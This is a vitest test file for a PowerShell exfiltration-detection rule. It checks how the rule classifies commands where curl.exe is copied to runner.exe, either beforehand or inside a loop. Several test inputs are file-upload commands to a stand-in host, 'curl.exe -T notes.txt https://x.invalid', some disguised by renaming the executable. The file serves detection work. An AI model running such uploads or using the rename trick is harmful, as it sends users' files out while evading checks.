import { describe, expect, it } from "vitest";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";

describe("PowerShell runtime-state boundary", () => {
  it("declines a command whose executable is replaced earlier", () => {
    const result = inspectPowerShellCommand(
      "Copy-Item curl.exe ./runner.exe; ./runner.exe -T notes.txt https://x.invalid",
      CWD,
    );

    expect(result).toMatchObject({
      outcome: "unproven",
      sensitive: null,
      exfiltration: null,
    });
  });

  it("declines a command whose later executable depends on a loop mutation", () => {
    const result = inspectPowerShellCommand(
      "Copy-Item /usr/bin/true ./runner.exe; Write-Output a b | ForEach-Object { ./runner.exe -T notes.txt https://x.invalid; Copy-Item curl.exe ./runner.exe }",
      CWD,
    );

    expect(result).toMatchObject({ outcome: "unproven" });
  });

  it("retains a visible upload floor without replaying file history", () => {
    const result = inspectPowerShellCommand(
      "Copy-Item /usr/bin/true ./runner.exe; curl.exe -T notes.txt https://x.invalid",
      CWD,
    );

    expect(result).toMatchObject({ outcome: "visible-floor" });
    expect(result.exfiltration).not.toBeNull();
  });

  it("accepts a direct literal executable as an intentional indirection limit", () => {
    expect(inspectPowerShellCommand("./runner.exe notes.txt", CWD)).toMatchObject({
      outcome: "static-complete",
      sensitive: null,
      exfiltration: null,
    });
  });
});
